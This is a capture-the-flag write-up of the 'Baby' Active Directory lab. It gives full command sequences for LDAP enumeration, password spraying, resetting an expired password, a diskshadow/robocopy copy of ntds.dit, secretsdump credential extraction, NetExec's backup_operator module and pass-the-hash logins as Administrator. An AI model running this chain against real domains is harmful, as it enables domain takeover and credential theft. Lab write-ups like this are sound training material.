---
title: "Baby VulnLab" 
date: 2025-09-20 18:00:00 0000+
tags: [WriteUp, Baby, VL, Enumeration, Active Directory, SMB, Rusthound-CE, Lateral Movement ,Bloodhound, Privilege Escalation, PasswordSpraying, BackupOperators, SeBackupPrivilege ,NetExec, Windows]
categories: [WriteUps,VulnLab]
image:
  path: /assets/images/Baby_VL/preview_baby.png
---
# Baby VulnLab Writeup

Baby is a Easy box from VulnLab hosted on HackTheBox which focuses on Active directory, for initial access we need some enumeration to identify the user whose password needs to be resetted, after that we have valid credentials across domain, after some more enumeration we found that the user is a part of Backup operators group, enabling us in making the shadow copy of the NTDS.DIT database allowing us to get Administrator privileges on the domain.

![image.png](/assets/images/Baby_VL/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.129.234.71
```

![image.png](/assets/images/Baby_VL/image%201.png)

![image.png](/assets/images/Baby_VL/image%202.png)

Looking at the results we can see that we have a numerous ports open namely DNS, SMB, LDAP and by these three we can say that it is an Active Directory box.

I will add the Hostname and the domain name of the box to my /etc/hosts file for DNS resolution.

We can also see that the clock skew is set to 1m15s, means the clock is 1m15s behind.

Port 5985 and 3389 is open means winrm and rdp is open to connect if we have permissions.

### SMB Enumeration

SMB ports are open on the box so lets try to enumerate it.

```bash
nxc smb baby.vl -u '' -p ''
```

![image.png](/assets/images/Baby_VL/image%203.png)

We have null authentication, lets try to enumerate the shares.

```bash
nxc smb baby.vl -u '' -p '' --shares
```

![image.png](/assets/images/Baby_VL/image%204.png)

Errors out, lets try with the guest authentication.

```bash
nxc smb baby.vl -u '.' -p '' --shares
```

![image.png](/assets/images/Baby_VL/image%205.png)

So right now the SMB doors are closed for us, we need some valid credentials across the domain to list shares on this server.

### LDAP Enumeration

Lets proceed with the LDAP enumeration.

```bash
nxc ldap baby.vl -u '' -p ''
```

![image.png](/assets/images/Baby_VL/image%206.png)

We can see that we have a valid null authentication across the domain, so lets try to enumerate the users on the domain.

```bash
nxc ldap baby.vl -u '' -p '' --users
```

![image.png](/assets/images/Baby_VL/image%207.png)

Lets go! we have some domain users and we have some credentials too.

I will save all these users to a users.txt file.

Note that these are only users on the domain machine accounts and groups are not shown by NetExec.

We can get the groups and machine accounts by this way.

```bash
ldapsearch -x -H ldap://10.129.234.71/ -b 'DC=baby,DC=vl' | grep "displayName:"
```

![image.png](/assets/images/Baby_VL/image%208.png)

Lets now test the authentication using password spray.

## Exploitation

### Shell as Caroline.Robinson

We have a credential and we have some users, lets proceed with the password spray attack on the domain.

```bash
nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
```

![image.png](/assets/images/Baby_VL/image%209.png)

Now this was unexpected, None of the users have this password.

So I dumped all the ldap data using this query.

```bash
ldapsearch -x -H ldap://10.129.234.71/ -b 'DC=baby,DC=vl' > ldapdump.txt
```

Going through the data I found 2 more new users, which are part of **dev** and **IT** OU‚Äôs.

One was **Ian Walker.**

![image.png](/assets/images/Baby_VL/image%2010.png)

The Other one was **Caroline Robinson**

![image.png](/assets/images/Baby_VL/image%2011.png)

And when I tried our password with these 2 users. I got this.

```bash
nxc smb baby.vl -u users.txt -p 'BabyStart123!' --continue-on-success
```

![image.png](/assets/images/Baby_VL/image%2012.png)

It says for caroline.robinson that **STATUS_PASSWORD_MUST_CHANGE.**

So lets change **Caroline.robinson‚Äôs** password using smbpasswd.py from the impacket‚Äôs collection

```bash
impacket-smbpasswd -newpass 'aashwin10!' baby.vl/caroline.robinson@babydc.baby.vl
```

![image.png](/assets/images/Baby_VL/image%2013.png)

Lets authenticate and verify our newly set password.

```bash
nxc ldap baby.vl -u 'caroline.robinson' -p 'aashwin10!'
```

![image.png](/assets/images/Baby_VL/image%2014.png)

It says **Pwned!** means we have elevated access.

Lets check for the winrm access as this user.

```bash
nxc winrm baby.vl -u 'caroline.robinson' -p 'aashwin10!'
```

![image.png](/assets/images/Baby_VL/image%2015.png)

Lets get a shell on the box using evil-winrm

```bash
evil-winrm -i baby.vl -u 'caroline.robinson' -p 'aashwin10!'
```

![image.png](/assets/images/Baby_VL/image%2016.png)

And we are in!

Looking at this user‚Äôs desktop we have our first flag user.txt

![image.png](/assets/images/Baby_VL/image%2017.png)

Claiming and submitting it.

## Privilege Escalation

Now our goal is to get to the Administrator, so lets find ways of privilege escalation.

### Method 1 - Long way [Manual Exploitation]

Enumerated for some potential privesc vulnerabilities but did not seem to find any, we proceed with the Bloodhound enumeration on the domain.

Since we have valid credentials we can dump all the ldap data and visualize it in a graphical form.

I will use Rusthound-ce as the collector as it also collects the ADCS data too.

```bash
rusthound-ce -d baby.vl -u 'caroline.robinson' -p 'aashwin10!' -f babydc.baby.vl -c All -z
```

![image.png](/assets/images/Baby_VL/image%2018.png)

Starting Bloodhound-CE locally and uploading this data for ingestion.

Upon analyzing the data in bloodhound.

![image.png](/assets/images/Baby_VL/image%2019.png)

User Caroline is a part of the **BackupOperators** Group.

Members of this group have permissions to create a shadow copy of the system.hive and ntds database to escalate their privileges.

So lets create the shadow copy of SYSTEM and NTDS.

To do that follow these steps.

```powershell
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Save these contents to a file and converted this file to DOS format so that it can be easily read by windows.

![image.png](/assets/images/Baby_VL/image%2020.png)

Now transferring this file to our remote machine using **Caroline.robinson‚Äôs** shell.

![image.png](/assets/images/Baby_VL/image%2021.png)

Now we use **diskshadow.exe.**

```powershell
diskshadow.exe /s backup.txt
```

![image.png](/assets/images/Baby_VL/image%2022.png)

After running **diskshadow.exe**, it says that the copy is successfully exposed on E drive.

Now we use **robocopy** to copy the ntds.dit database file to our shadow drive E:\

```powershell
robocopy /b E:\windows\ntds . ntds.dit
```

![image.png](/assets/images/Baby_VL/image%2023.png)

**Successfully** copied **NTDS.dit** database from **E drive**.

Now we save the system hive too using registry editor.

```powershell
reg save hklm\system c:\users\caroline.robinson\documents\system.hive
```

![image.png](/assets/images/Baby_VL/image%2024.png)

Successfully saved both the hives to the documents folder form the shadow drive E:\

Now we download these to our local system and use impacket‚Äôs **secretsdump** on them to extract the hashes.

```bash
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL
```

![image.png](/assets/images/Baby_VL/image%2025.png)

We now have the full domain credential dump.

Logging in using Evil-Winrm as **Administrator**.

![image.png](/assets/images/Baby_VL/image%2026.png)
This is the one way of exploiting this privilege another yet more easy way is through NetExec.

### Method 2 - Short way [NetExec]

This is probably the most easiest way of escalating privileges.

This method uses NetExec‚Äôs **backup_operator** module. It says that if the controlled user is a part of Backup operators group means have **SeBackupPrivilege** it can dump the **SYSTEM**, **SECURITY** and **NTDS** hives on the target system no admin privileges needed.

```bash
nxc smb baby.vl -u 'caroline.robinson' -p 'aashwin10!' -M backup_operator
```

![image.png](/assets/images/Baby_VL/image%2027.png)

Now here the hash of the **Administrator** account is not correct, maybe it was an old password hash.

But the key thing here was we received the $**MACHINE.ACC** hash which can be used to dump the **NTDS.DIT**

```bash
nxc smb baby.vl -u 'BABYDC$' -H '3d538eabff6633b62dbaa5fb5ade3b4d' --ntds
```

![image.png](/assets/images/Baby_VL/image%2028.png)

**It says me to go grab a redbull ü§°**

And yeah now we have the correct hash of the administrator account, we can verify this using nxc only.

```bash
nxc ldap baby.vl -u 'Administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d'
```

![image.png](/assets/images/Baby_VL/image%2029.png)

Now we login through evil-winrm and claim our root.txt flag.

```bash
evil-winrm -i baby.vl -u 'Administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d'
```

![image.png](/assets/images/Baby_VL/image%2030.png)

Rooted!

![image.png](/assets/images/Baby_VL/image%2031.png)

Thanks for reading üòä‚úåÔ∏è
